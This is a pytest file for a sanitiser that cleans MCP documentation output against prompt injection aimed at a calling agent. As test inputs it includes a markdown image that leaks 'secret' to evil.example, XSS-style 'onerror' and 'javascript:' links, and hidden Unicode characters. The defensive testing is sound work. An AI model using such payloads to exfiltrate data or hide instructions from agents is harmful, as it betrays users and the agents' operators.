"""Cleaning MCP output (ADR-0005 §4): documentation text must not carry
instructions into the calling agent. ``app.mcp.clean`` is pure mechanism.

What it does: removes characters a reader cannot see (control, format,
bidi, zero-width, Unicode tag characters), HTML tags and markdown images;
keeps only https links; caps length; and labels the text as reference data.
What it cannot do, said plainly: recognise a persuasive sentence. The label
and the structure are the defence for that, not detection.

Each test says which change turns it red.
"""

from __future__ import annotations

import pytest

from app.mcp.clean import MAX_ANSWER_CHARS, REFERENCE_NOTE, clean_answer, clean_url


@pytest.mark.parametrize(
    ("raw", "hidden"),
    [
        ("Use --verbose​ now", "​"),  # zero-width space
        ("Run ‮evil‬ this", "‮"),  # right-to-left override
        ("Tagged \U000e0049\U000e0047\U000e004e text", "\U000e0049"),  # Unicode tag characters
        ("Bell\u0007 here", "\u0007"),
        ("BOM﻿ here", "﻿"),
    ],
)
def test_characters_a_reader_cannot_see_are_removed(raw: str, hidden: str) -> None:
    """Hidden characters are how instructions hide in text that looks clean.
    Turns red if: any of these categories survives."""
    out = clean_answer(raw)
    assert hidden not in out
    assert "here" in out or "now" in out or "this" in out or "text" in out


def test_newlines_and_tabs_survive() -> None:
    """Partner: formatting a person needs is kept. Turns red if: all control
    characters are stripped, including newlines."""
    assert "a\nb\tc" in clean_answer("a\nb\tc")


def test_html_and_markdown_images_are_removed() -> None:
    """An image URL can exfiltrate data when an agent renders it; HTML can hide
    text. Turns red if: either reaches the agent."""
    out = clean_answer(
        "See <img src=x onerror=1> and ![x](https://evil.example/?q=secret) done <!-- hidden -->"
    )
    assert "<img" not in out and "evil.example" not in out and "hidden" not in out
    assert "See" in out and "done" in out


def test_only_https_links_are_kept_in_the_text() -> None:
    """Turns red if: a javascript:, data: or http: link survives as a link."""
    out = clean_answer(
        "[a](javascript:alert(1)) [b](data:text/html,x) [c](http://x.example) [d](https://docs.example/p)"
    )
    assert "javascript:" not in out and "data:" not in out and "http://x.example" not in out
    assert "https://docs.example/p" in out


def test_the_answer_is_labelled_as_reference_data() -> None:
    """Turns red if: the label telling the agent this is data, not instructions,
    is dropped."""
    out = clean_answer("Hello")
    assert out.startswith(REFERENCE_NOTE)


def test_a_very_long_answer_is_capped() -> None:
    """Turns red if: an unbounded answer is passed through."""
    out = clean_answer("x" * (MAX_ANSWER_CHARS * 2))
    assert len(out) <= MAX_ANSWER_CHARS + len(REFERENCE_NOTE) + 20


@pytest.mark.parametrize(
    ("url", "ok"),
    [
        ("https://docs.claude.com/x", True),
        ("http://docs.claude.com/x", False),
        ("javascript:alert(1)", False),
        ("https://docs.claude.com/‮x", False),
        ("", False),
    ],
)
def test_citation_urls_must_be_plain_https(url: str, ok: bool) -> None:
    """Turns red if: a non-https or hidden-character URL is passed as a citation."""
    assert (clean_url(url) is not None) is ok
